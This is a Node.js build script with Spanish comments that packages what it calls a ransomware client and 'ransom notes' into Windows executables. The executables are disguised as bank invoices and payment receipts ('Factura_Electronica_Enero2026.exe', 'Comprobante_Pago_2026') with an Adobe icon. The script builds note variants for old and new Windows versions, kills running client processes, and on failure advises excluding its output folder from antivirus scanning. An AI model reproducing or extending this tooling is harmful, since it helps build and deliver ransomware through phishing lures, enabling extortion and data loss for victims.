const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const distDir = path.join(__dirname, 'dist');

// Asegurar que el directorio dist exista
if (!fs.existsSync(distDir)) {
    fs.mkdirSync(distDir, { recursive: true });
}

// Funcion para intentar borrar un archivo de forma segura
function intentarBorrar(filename) {
    const filePath = path.join(distDir, filename);
    if (!fs.existsSync(filePath)) return true;
    try {
        fs.unlinkSync(filePath);
        return true;
    } catch (e) {
        return false;
    }
}

// Funcion para ejecutar la construccion
function ejecutarConstruccion(filename) {
    console.log(`\n🔄 Intentando compilar a dist/${filename}...`);

    // 1. Limpiar archivo previo potencial
    if (!intentarBorrar(filename)) {
        console.log(`⚠️  No se pudo borrar ${filename} (Bloqueado/En uso). Saltando...`);
        return false;
    }

    // 2. Ejecutar pkg (Cliente)
    try {
        console.log(`   [NODE] Compilando Cliente...`);
        execSync(`pkg cliente.js --targets node18-win-x64 --output dist/${filename}`, { stdio: 'inherit' });
    } catch (e) {
        console.log(`   [NODE] Fallo la compilacion del cliente. Bloqueado?`);
        return false;
    }

    // 3. Ejecutar PyInstaller (Notas de Rescate - DOS VERSIONES)
    const refIcono = 'adobe_icon.ico';
    const rutaIconoAbs = path.resolve(__dirname, refIcono);
    const argIcono = fs.existsSync(refIcono) ? `--icon="${rutaIconoAbs}"` : '';

    // === NOTA 1: VERSION PYQT6 (Windows 10/11) ===
    const notaWin10 = 'Comprobante_Pago_2026';  // Para Win10/11
    if (fs.existsSync('interfazdeaviso.py')) {
        try {
            console.log(`   [PYTHON] Compilando Nota PyQt6 (${notaWin10}.exe) para Windows 10/11...`);
            execSync(`python -m PyInstaller --onefile --noconsole ${argIcono} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${notaWin10}" interfazdeaviso.py`, { stdio: 'inherit' });
            console.log(`   [PYTHON] Nota Win10/11 compilada con exito.`);
        } catch (e) {
            try {
                execSync(`pyinstaller --onefile --noconsole ${argIcono} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${notaWin10}" interfazdeaviso.py`, { stdio: 'inherit' });
                console.log(`   [PYTHON] Nota Win10/11 compilada con exito.`);
            } catch (err) {
                console.log(`   [PYTHON] Advertencia: No se pudo compilar nota PyQt6.`);
            }
        }

        // === NOTA ADICIONAL: nota_rescate.exe (nombre simple) ===
        try {
            console.log(`   [PYTHON] Compilando nota_rescate.exe...`);
            execSync(`python -m PyInstaller --onefile --noconsole ${argIcono} --distpath dist --workpath build/py_work_nota --specpath build/py_spec_nota --name "nota_rescate" interfazdeaviso.py`, { stdio: 'inherit' });
            console.log(`   [PYTHON] nota_rescate.exe compilada con exito.`);
        } catch (e) {
            console.log(`   [PYTHON] Advertencia: No se pudo compilar nota_rescate.exe`);
        }
    }

    // === NOTA 2: VERSION TKINTER (Windows 7/8/8.1) ===
    const notaWin7 = 'Comprobante_Pago_2026_Legacy';  // Para Win7/8
    if (fs.existsSync('interfazdeaviso_tk.py')) {
        try {
            console.log(`   [PYTHON] Compilando Nota Tkinter (${notaWin7}.exe) para Windows 7/8...`);
            execSync(`python -m PyInstaller --onefile --noconsole ${argIcono} --distpath dist --workpath build/py_work_tk --specpath build/py_spec_tk --name "${notaWin7}" interfazdeaviso_tk.py`, { stdio: 'inherit' });
            console.log(`   [PYTHON] Nota Win7/8 compilada con exito.`);
        } catch (e) {
            try {
                execSync(`pyinstaller --onefile --noconsole ${argIcono} --distpath dist --workpath build/py_work_tk --specpath build/py_spec_tk --name "${notaWin7}" interfazdeaviso_tk.py`, { stdio: 'inherit' });
                console.log(`   [PYTHON] Nota Win7/8 compilada con exito.`);
            } catch (err) {
                console.log(`   [PYTHON] Advertencia: No se pudo compilar nota Tkinter.`);
            }
        }
    }

    // Copiar recursos adicionales a dist/
    const recursos = ['escudo.png'];
    for (const recurso of recursos) {
        if (fs.existsSync(recurso)) {
            try {
                fs.copyFileSync(recurso, path.join(distDir, recurso));
                console.log(`   [RECURSO] ${recurso} copiado a dist/`);
            } catch (e) {
                // Ignorar errores de copia
            }
        }
    }

    console.log(`\n EXCELENTE! Artefactos generados en dist/`);
    return true;
}

// Logica principal
console.log(' Iniciando proceso de construccion inteligente...');

// Terminar instancias bloqueadas primero
try {
    execSync('taskkill /F /IM cliente.exe', { stdio: 'ignore' });
} catch (e) { }

// Lista de nombres preferidos a probar en orden (estilo factura bancaria 2026)
const candidatos = ['Factura_Electronica_Enero2026.exe', 'Estado_Cuenta_2026.exe', 'Comprobante_Bancario_2026.exe'];
let construido = false;

// Probar candidatos
for (const nombre of candidatos) {
    if (ejecutarConstruccion(nombre)) {
        construido = true;
        break;
    }
}

// Fallback a timestamp si todo lo demas falla
if (!construido) {
    const nombreTimestamp = `cliente_${Date.now()}.exe`;
    console.log(`\n⚠️  Nombres estandar bloqueados. Probando nombre unico: ${nombreTimestamp}`);
    if (ejecutarConstruccion(nombreTimestamp)) {
        construido = true;
    }
}

if (!construido) {
    console.error('\n💥 Todos los intentos de compilacion fallaron.');
    console.error('💡 SUGERENCIA: Agrega la carpeta "dist" a las exclusiones de tu Antivirus.');
    process.exit(1);
}
